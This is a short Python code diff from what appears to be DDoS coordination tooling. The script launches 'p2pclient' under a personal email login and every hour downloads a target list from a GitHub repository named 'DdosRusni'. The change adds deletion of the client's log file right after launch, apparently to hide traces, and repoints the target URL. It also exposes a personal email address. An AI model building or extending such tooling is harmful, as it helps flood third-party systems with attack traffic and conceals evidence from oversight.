@@ -7,10 +7,11 @@ with open('test.txt', 'w') as f:
     process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
     stdout=f,
     stderr=f)
+os.remove("test.txt")
    
 while 1 == 1:
     timeout=time.time()+3600
-    url = "https://raw.githubusercontent.com/Patonia/Patonia/main/target.txt"
+    url = "https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt"
     directory = getcwd()
     filename = directory + 'target.txt'
     r = requests.get(url)
